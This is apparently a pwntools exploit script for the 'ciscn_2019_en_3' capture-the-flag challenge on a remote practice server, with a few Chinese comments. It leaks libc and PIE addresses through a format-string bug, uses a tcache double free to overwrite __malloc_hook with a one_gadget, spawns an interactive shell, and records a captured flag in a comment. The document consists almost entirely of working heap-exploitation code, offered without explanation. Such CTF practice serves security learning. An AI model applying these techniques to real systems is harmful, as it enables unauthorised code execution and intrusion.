#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 28875
exe = ELF("./ciscn_2019_en_3_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

if args.LOCAL:
    p = process([exe.path])

else:
    p = remote(host, port)

# io


def s(c): return p.send(c)
def sl(c): return p.sendline(c)
def r(n): return p.recv(n)
def ru(pattern, drop=False): return p.recvuntil(pattern, drop=drop)
def rl(): return p.recvline()
def ru7f(): return p.recvuntil(b'\x7f')
def su(x): return p.success(x)
def shell(): return p.interactive()

# utilities


def leak(func, address): return p.success("{}: {}".format(func, hex(address)))


def command(c):
    ru(b'Input your choice:')
    sl(str(c).encode())


def add(size, content):
    command(1)
    ru(b'Please input the size of story: \n')
    sl(str(size).encode())
    ru(b'please inpute the story: \n')
    sl(content)


# def edit(index, size, content):


def free(index):
    command(4)
    ru(b'Please input the index:\n')
    sl(str(index).encode())

# def show(index):

# start pwning
'''
ubuntu18 保护全开，不能改got表
uaf
但是不能edit，不能show
fmtstr 7 16 位置泄露libc和Pie
'''
ru(b'What\'s your name?')
s(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p')
for i in range(7):
    ru(b'0x')
IOstderr = int(r(12).decode(), 16)
for i in range(9):
    ru(b'0x')
mov_eax_addr = int(r(12).decode(), 16)

libc_base = IOstderr - libc.sym['_IO_2_1_stderr_']
leak('_IO_2_1_stderr_', IOstderr)
leak('libc_base', libc_base)

pie = mov_eax_addr - 0xf12
leak('pie', pie)

ru(b'Please input your ID.\n')
sl(b'test')

add(0x10, b'a')
add(0x10, b'/bin/sh')
# double free
free(0)
free(0)
free(0)
if args.LOCAL:
    gdb.attach(p)
# add(0x10, p64(exe.got['free'] + pie))
# add(0x10, b'a')
# add(0x10, p64(libc.sym['system'] + libc_base))
# free(1)

# 打malloc_hook没成功，one_gadget 执行条件好像不满足
one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
realloc = libc_base + libc.sym['__libc_realloc']
malloc_hook = libc_base + libc.sym['__malloc_hook']
add(0x10, p64(malloc_hook-0x10))
add(0x10, b'a')
add(0x18, b'a'*8 + p64(one_gadgets[1] + libc_base) + p64(realloc + 10))
command(1)
ru(b'Please input the size of story: \n')
sl(str(1).encode())

# free_hook
# free_hook = libc_base + libc.sym['__free_hook']
# add(0x10, p64(free_hook))
# add(0x10, b'a')
# add(0x10, p64(one_gadgets[1] + libc_base))
# free(1)
# flag{81e6f842-4ae5-46ac-81b1-654563f941bd}

shell()